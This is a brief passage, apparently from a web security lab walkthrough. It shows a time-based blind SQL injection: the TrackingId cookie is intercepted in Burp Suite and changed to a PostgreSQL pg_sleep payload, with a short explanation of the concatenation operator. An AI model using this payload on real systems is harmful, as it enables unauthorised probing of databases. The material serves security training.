Intercept the request using `BurpSuite` and then `Modify` the TrackingId cookie, changing it to:

```sql
TrackingId=x'||pg_sleep(10)--
```
` || ` is concatenation operator.
